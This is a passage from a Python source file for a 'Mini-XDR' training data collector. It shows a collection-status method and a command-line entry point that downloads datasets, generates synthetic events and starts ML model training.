            "collected_datasets": [],
            "training_data_size": 0,
            "last_training": None
        }
        
        # Check which datasets have been collected
        for dataset_name in self.datasets.keys():
            dataset_dir = self.data_dir / dataset_name
            if dataset_dir.exists() and any(dataset_dir.iterdir()):
                status["collected_datasets"].append(dataset_name)
        
        # Check training metadata
        metadata_path = self.data_dir / "training_metadata.json"
        if metadata_path.exists():
            with open(metadata_path, 'r') as f:
                metadata = json.load(f)
                status["last_training"] = metadata.get("training_timestamp")
                status["training_data_size"] = metadata.get("training_data_size", 0)
        
        return status


# Standalone execution
async def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Mini-XDR Training Data Collector")
    parser.add_argument("--datasets", nargs="+", help="Specific datasets to collect")
    parser.add_argument("--train", action="store_true", help="Train ML models after collection")
    parser.add_argument("--status", action="store_true", help="Show collection status")
    parser.add_argument("--synthetic-only", action="store_true", help="Generate only synthetic data")
    
    args = parser.parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    collector = TrainingDataCollector()
    
    if args.status:
        status = await collector.get_collection_status()
        print(json.dumps(status, indent=2))
        return
    
    if args.synthetic_only:
        # Generate only synthetic data
        synthetic_results = await collector._generate_synthetic_data()
        print(f"Generated {synthetic_results.get('record_count', 0)} synthetic events")
        
        if args.train:
            integration_results = await collector.integrate_with_ml_training({"successful_downloads": []})
            print(f"Training results: {integration_results.get('model_training_results', {})}")
        
        return
    
    # Collect datasets
    results = await collector.collect_all_datasets(args.datasets)
    
    print(f"Collection completed:")
    print(f"- Total records: {results['total_records']}")
    print(f"- Successful downloads: {len(results['successful_downloads'])}")
    print(f"- Failed downloads: {len(results['failed_downloads'])}")
    
    if args.train and results['successful_downloads']:
        print("\nStarting ML model training...")
        integration_results = await collector.integrate_with_ml_training(results)
        print(f"Training results: {integration_results.get('model_training_results', {})}")


if __name__ == "__main__":
    asyncio.run(main())
